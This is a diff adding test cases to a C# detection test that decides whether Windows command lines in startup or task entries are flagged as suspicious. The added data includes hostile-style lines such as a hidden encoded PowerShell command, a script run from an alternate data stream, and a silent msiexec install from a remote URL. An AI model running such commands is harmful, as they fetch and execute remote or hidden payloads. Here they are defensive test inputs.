@@ -173,6 +173,17 @@ public class DebloatServicesAppsTests
     [InlineData(@"rundll32.exe url.dll,FileProtocolHandler https://example.invalid/x", true)]
     [InlineData(@"rundll32.exe C:\Windows\System32\x.dll,Entry C:\Users\Public\payload.bin", true)]
     [InlineData(@"""C:\Windows\system32\rundll32.exe"" C:\Windows\system32\AppxDeploymentClient.dll,AppxPreStageCleanupRunTask", false)]
+    // The host without ".exe", and an alternate data stream on a folder users can write to.
+    [InlineData(@"powershell -w hidden -enc SQBFAFgA", true)]
+    [InlineData(@"wscript.exe C:\Windows\System32\Tasks:x.vbs", true)]
+    // Signed launchers: flagged only when they start a file outside System32 or a URL.
+    [InlineData(@"C:\Windows\explorer.exe C:\Users\Public\x.exe", true)]
+    [InlineData(@"explorer.exe", false)]
+    [InlineData(@"explorer.exe shell:::{2559a1f3-21d7-11d4-bdaf-00c04f60b9f0}", false)]
+    [InlineData(@"pcalua.exe -a C:\Users\Public\x.exe", true)]
+    [InlineData(@"msiexec.exe /i https://example.invalid/x.msi /qn", true)]
+    [InlineData(@"msiexec.exe /x {11111111-2222-3333-4444-555555555555}", false)]
+    [InlineData(@"control.exe C:\Windows\System32\desk.cpl", false)]
     public void ScriptHostEntriesAreFlaggedUnlessTheyOnlyRunSystemFiles(string command, bool flagged)
     {
         var windows = Environment.GetFolderPath(Environment.SpecialFolder.Windows);
